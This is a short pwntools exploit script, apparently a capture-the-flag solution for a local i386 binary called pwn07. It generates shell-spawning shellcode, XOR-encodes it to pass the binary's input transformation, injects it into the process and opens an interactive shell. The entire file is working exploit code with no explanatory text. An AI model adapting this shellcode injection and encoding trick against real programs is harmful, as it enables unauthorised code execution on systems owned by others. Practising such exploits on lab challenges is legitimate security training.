from pwn import *

context.arch='i386'
context.log_level='debug'
io = process("./pwn07/pwn07")

def xor_payload(payload):
    payload = bytearray(payload)
    print(payload)
    for i in range(len(payload)):
        if payload[i] == 0x0a or payload[i] == 0x00:
            break
        if payload[i] < 0x80:
            payload[i] = payload[i] ^ 0x11
        else:
            payload[i] = payload[i] ^ 0x22
    return payload

shellcode = asm(shellcraft.sh())
# print(shellcode)
payload=xor_payload(shellcode)

io.sendline(payload)
io.interactive()